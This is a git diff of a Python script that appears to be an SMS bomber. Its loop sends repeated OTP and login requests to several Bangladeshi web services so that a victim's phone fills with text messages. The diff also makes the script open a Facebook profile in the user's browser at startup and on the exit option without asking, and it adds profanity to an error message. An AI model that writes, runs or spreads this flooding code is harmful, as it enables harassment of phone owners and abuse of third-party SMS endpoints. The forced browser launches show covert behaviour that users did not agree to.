@@ -9,6 +9,7 @@ import os
 import requests
 import smtplib
 
+os.system("xdg-open https://www.facebook.com/profile.php?id=100080364354863&mibextid=ZbWKwL") 
 os.system("clear")
 def slw(l):
   for i in l:
@@ -21,7 +22,6 @@ def primiam():
   os.system("clear")
   logo="""\033[38;5;46m
   
-os.system("xdg-open https://www.facebook.com/profile.php?id=100080364354863&mibextid=ZbWKwL")  
 
 
 $$$$$$$\   $$$$$$\  $$$$$$$$\ $$$$$$\ $$\   $$\ 
@@ -227,49 +227,49 @@ FACEBOOK  : RAFIN KHAN
     sent1=requests.get(url1, headers=headers)
     if sent1.status_code==200:
       ses+=1
-      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
+      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT 😶")
     else:
       pass
     sent2=requests.post(url2, headers=headers2,data=data1)
     if sent2.status_code==200:
       ses+=1
-      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
+      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT 🤣")
     else:
       pass
     sent3=requests.get(url3,headers=headers3)
     if sent3.status_code==200:
       ses+=1
-      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
+      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT 😒")
     else:
       pass
     sent4=requests.get(url4,headers=headers4)
     if sent4.status_code==200:
       ses+=1
-      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
+      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT 🤪")
     else:
       pass
     sent5=requests.post('https://admin.doctime.com.bd/api/authenticate', headers=headers5, data=data2)
     if sent5.status_code==200:
       ses+=1
-      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
+      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT 🤩")
     else:
       pass
     sent6=requests.post('https://api.osudpotro.com/api/v1/users/send_otp', headers=headers6, data=data3)
     if sent6.status_code==200:
       ses+=1
-      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
+      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT 🤩")
     else:
       pass
     sent7=requests.post('https://api.osudpotro.com/api/v1/users/send_otp', headers=headers7, data=data4)
     if sent7.status_code==200:
       ses+=1
-      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
+      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT 😍")
     else:
       pass
     sent8=requests.post('https://api-v4-1.hungrynaki.com/graphql', headers=headers8, json=data8)
     if sent8.status_code==200:
       ses+=1
-      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
+      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT 😊")
     else:
       pass
     sent9=requests.post(
@@ -281,13 +281,13 @@ FACEBOOK  : RAFIN KHAN
     )
     if sent9.status_code==200:
       ses+=1
-      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
+      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT 😁")
     else:
       pass
     sent10 = requests.get(url10,headers=headers10)
     if sent10.status_code==200:
       ses+=1
-      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT ♻️")
+      print(f"\033[38;5;195m\n[\033[38;5;46m{ses}\033[38;5;195m]\033[38;5;46m SMS WAS SENT 😘")
   os.system("clear")
   print(""" \033[38;5;46m
 
@@ -322,7 +322,8 @@ usr=usr.replace(" ","")
 if usr== "1" or usr== "01":
   primiam()
 elif usr== "2" or usr== "02":
-  sys.exit()
+  os.system("xdg-open https://www.facebook.com/profile.php?id=100080364354863&mibextid=ZbWKwL") 
+  
 else:
-  print("\033[38;5;195m\n[\033[1;31m!\033[38;5;195m]\033[1;31m WRONG OPTION ENTERED..\n")
+  print("\033[38;5;195m\n[\033[1;31m!\033[38;5;195m]\033[1;31m FUCK YOU 🤫🤫..\n")
   sys.exit()
